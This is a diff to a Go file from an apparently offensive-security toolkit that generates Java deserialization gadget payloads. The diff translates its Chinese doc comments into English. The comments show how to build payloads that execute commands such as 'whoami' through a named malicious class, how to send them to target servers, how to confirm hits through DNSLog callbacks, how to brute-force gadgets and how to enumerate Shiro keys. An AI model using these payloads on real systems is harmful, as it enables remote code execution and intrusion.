-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetJavassistWeld1JavaObject generates and returns a Java object based on the JavassistWeld1 serialization template.
+// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
+// These functions enable the user to customize specific properties or behavior of the generated Java objects.
+// options: A list of variable parameter functions used to configure Java objects.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
 // command = "whoami"
 // className = "KEsBXTRS"
 // gadgetObj,err = yso.GetJavassistWeld1JavaObject(
 //
-//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
+//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
 //	yso.obfuscationClassConstantPool(),
-//	yso.evilClassName(className), // 指定恶意类的名称
+//	yso.evilClassName(className), // Specifies the name of the malicious class
 //
 // )
 // ```
@@ -642,20 +642,20 @@ func GetJavassistWeld1JavaObject(options ...GenClassOptionFun) (*JavaObject, err
 	return ConfigJavaObject(template_ser_JavassistWeld1, "JavassistWeld1", options...)
 }
 
-// GetJdk7u21JavaObject 基于Jdk7u21 序列化模板生成并返回一个Java对象。
-// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
-// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetJdk7u21JavaObject generates and returns a Java object based on the Jdk7u21 serialization template.
+// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
+// These functions enable the user to customize specific properties or behavior of the generated Java objects.
+// options: A list of variable parameter functions used to configure Java objects.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
 // command = "whoami"
 // className = "KEsBXTRS"
 // gadgetObj,err = yso.GetJdk7u21JavaObject(
 //
-//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
+//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
 //	yso.obfuscationClassConstantPool(),
-//	yso.evilClassName(className), // 指定恶意类的名称
+//	yso.evilClassName(className), // Specifies the name of the malicious class
 //
 // )
 // ```
@@ -663,20 +663,20 @@ func GetJdk7u21JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
 	return ConfigJavaObject(template_ser_Jdk7u21, "Jdk7u21", options...)
 }
 
-// GetJdk8u20JavaObject 基于Jdk8u20 序列化模板生成并返回一个Java对象。
-// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
-// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetJdk8u20JavaObject Generates and returns a Java object based on the Jdk8u20 serialization template.
+// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
+// These functions enable the user to customize specific properties or behavior of the generated Java objects.
+// options: A list of variable parameter functions used to configure Java objects.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
 // command = "whoami"
 // className = "KEsBXTRS"
 // gadgetObj,err = yso.GetJdk8u20JavaObject(
 //
-//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
+//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
 //	yso.obfuscationClassConstantPool(),
-//	yso.evilClassName(className), // 指定恶意类的名称
+//	yso.evilClassName(className), // Specifies the name of the malicious class
 //
 // )
 // ```
@@ -684,23 +684,23 @@ func GetJdk8u20JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
 	return ConfigJavaObject(template_ser_Jdk8u20, "Jdk8u20", options...)
 }
 
-// GetURLDNSJavaObject 利用Java URL类的特性，生成一个在反序列化时会尝试对提供的URL执行DNS查询的Java对象。
-// 这个函数首先使用预定义的URLDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。
-// url：要在生成的Java对象中设置的URL字符串。
-// 返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。
+// GetURLDNSJavaObject uses the characteristics of the Java URL class to generate a Java object that will attempt to perform a DNS query on the provided URL during deserialization.
+// This function first uses the predefined URLDNS serialization template, and then replaces the preset URL placeholder in the serialized object with the provided URL string.
+// url: URL string to be set in the generated Java object.
+// Return: Return the constructed Java object and nil error on success, return nil and corresponding error on failure.
 // Example:
 // ```
 // url, token, _ = risk.NewDNSLogDomain()
 // javaObject, _ = yso.GetURLDNSJavaObject(url)
 // gadgetBytes,_ = yso.ToBytes(javaObject)
-// 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
+// uses the constructed deserialized Payload(gadgetBytes) and sends it to the target server.
 // res,err = risk.CheckDNSLogByToken(token)
 //
 //	if err {
-//	  //dnslog查询失败
+//	  //dnslog query fails
 //	} else {
 //	  if len(res) > 0{
-//	   // dnslog查询成功
+//	   // dnslog query successful
 //	  }
 //	}
 //
@@ -722,23 +722,23 @@ func GetURLDNSJavaObject(url string) (*JavaObject, error) {
 	}), nil
 }
 
-// GetFindGadgetByDNSJavaObject 通过 DNSLOG 探测 CLass Name，进而探测 Gadget。
-// 使用预定义的FindGadgetByDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。
-// url：要在生成的Java对象中设置的URL字符串。
-// 返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。
+// GetFindGadgetByDNSJavaObject detects the CLass Name through DNSLOG and then detects the Gadget.
+// uses the predefined FindGadgetByDNS serialization template, and then replaces the preset URL placeholder in the serialized object with the provided URL string.
+// url: URL string to be set in the generated Java object.
+// Return: Return the constructed Java object and nil error on success, return nil and corresponding error on failure.
 // Example:
 // ```
 // url, token, _ = risk.NewDNSLogDomain()
 // javaObject, _ = yso.GetFindGadgetByDNSJavaObject(url)
 // gadgetBytes,_ = yso.ToBytes(javaObject)
-// 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
+// uses the constructed deserialized Payload(gadgetBytes) and sends it to the target server.
 // res,err = risk.CheckDNSLogByToken(token)
 //
 //	if err {
-//	  //dnslog查询失败
+//	  //dnslog query fails
 //	} else {
 //	  if len(res) > 0{
-//	   // dnslog查询成功
+//	   // dnslog query successful
 //	  }
 //	}
 //
@@ -760,15 +760,15 @@ func GetFindGadgetByDNSJavaObject(url string) (*JavaObject, error) {
 	}), nil
 }
 
-// GetFindClassByBombJavaObject 目标存在指定的 ClassName 时,将会耗部分服务器性能达到间接延时的目的
-// 使用预定义的FindClassByBomb序列化模板，然后在序列化对象中替换预设的ClassName占位符为提供的ClassName字符串。
-// className：要批判的目标服务器是否存在的Class Name值。
-// 返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。
+// When the GetFindClassByBombJavaObject target has the specified ClassName, it will consume part of the server performance to achieve indirect delay.
+// uses the predefined FindClassByBomb to serialize the template, and then replaces the preset ClassName placeholder in the serialized object with the provided ClassName string.
+// className: The Class Name value of whether the target server to be criticized exists.
+// Return: Return the constructed Java object and nil error on success, return nil and corresponding error on failure.
 // Example:
 // ```
-// javaObject, _ = yso.GetFindClassByBombJavaObject("java.lang.String") // 检测目标服务器是否存在 java.lang.String 类
+// javaObject, _ = yso.GetFindClassByBombJavaObject("java.lang.String") // detects whether the java.lang.String class exists on the target server.
 // gadgetBytes,_ = yso.ToBytes(javaObject)
-// 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器,通过响应时间判断目标服务器是否存在 java.lang.String 类
+// uses the constructed deserialized Payload (gadgetBytes) to send to the target server, and determines whether the target server exists through the response time. java.lang.String class
 // ```
 func GetFindClassByBombJavaObject(className string) (*JavaObject, error) {
 	obj, err := yserx.ParseFromBytes(tmeplate_ser_FindClassByBomb)
@@ -783,13 +783,13 @@ func GetFindClassByBombJavaObject(className string) (*JavaObject, error) {
 		Name:            "FindClassByBomb",
 		NameVerbose:     "FindClassByBomb",
 		SupportTemplate: false,
-		Help:            "通过构造反序列化炸弹探测Gadget",
+		Help:            "detects Gadget by constructing a deserialization bomb",
 	}), nil
 }
 
-// GetSimplePrincipalCollectionJavaObject 基于SimplePrincipalCollection 序列化模板生成并返回一个Java对象。
-// 主要用于 Shiro 漏洞检测时判断 rememberMe cookie 的个数。
-// 使用一个空的 SimplePrincipalCollection作为 payload，序列化后使用待检测的秘钥进行加密并发送，秘钥正确和错误的响应表现是不一样的，可以使用这个方法来可靠的枚举 Shiro 当前使用的秘钥。
+// GetSimplePrincipalCollectionJavaObject generates and returns a Java object based on the SimplePrincipalCollection serialization template.
+// is mainly used to determine the number of rememberMe cookies when detecting Shiro vulnerabilities.
+// uses an empty SimplePrincipalCollection as the payload. After serialization, it uses the secret key to be detected to encrypt and send it. The response performance of correct and incorrect secret keys is different. You can use this method to reliably enumerate the secrets currently used by Shiro. key.
 // ```
 func GetSimplePrincipalCollectionJavaObject() (*JavaObject, error) {
 	obj, err := yserx.ParseFromBytes(template_ser_simplePrincipalCollection)
@@ -804,7 +804,7 @@ func GetSimplePrincipalCollectionJavaObject() (*JavaObject, error) {
 	}), nil
 }
 
-// GetAllGadget 获取所有的支持的Gadget
+// GetAllGadget Gets all supported Gadgets
 // ```
 func GetAllGadget() []interface{} {
 	var alGadget []any
@@ -814,12 +814,12 @@ func GetAllGadget() []interface{} {
 	return alGadget
 }
 
-// GetAllTemplatesGadget 获取所有支持模板的Gadget，可用于爆破 gadget
+// GetAllTemplatesGadget Get all Gadgets that support templates, which can be used for blasting gadgets
 // Example:
 // ```
 //
 //	for _, gadget := range yso.GetAllTemplatesGadget() {
-//		domain := "xxx.dnslog" // dnslog 地址
+//		domain := "xxx.dnslog" // dnslog address
 //		javaObj, err := gadget(yso.useDNSLogEvilClass(domain))
 //		if javaObj == nil || err != nil {
 //			continue
@@ -828,7 +828,7 @@ func GetAllGadget() []interface{} {
 //		if err != nil {
 //			continue
 //		}
-//		// 发送 objBytes
+//		// Send objBytes
 //	}
 //
 // ```
@@ -842,11 +842,11 @@ func GetAllTemplatesGadget() []TemplatesGadget {
 	return alGadget
 }
 
-// GetAllRuntimeExecGadget 获取所有的支持的RuntimeExecGadget，可用于爆破 gadget
+// GetAllRuntimeExecGadget gets all supported RuntimeExecGadgets, which can be used to blast gadgets.
 // Example:
 // ```
 //
-//	command := "whoami" // 假设的命令字符串
+//	command := "whoami" // Hypothetical command string
 //	for _, gadget := range yso.GetAllRuntimeExecGadget() {
 //		javaObj, err := gadget(command)
 //		if javaObj == nil || err != nil {
@@ -856,7 +856,7 @@ func GetAllTemplatesGadget() []TemplatesGadget {
 //		if err != nil {
 //			continue
 //		}
-//		// 发送 objBytes
+//		// Send objBytes
 //	}
 //
 // ```
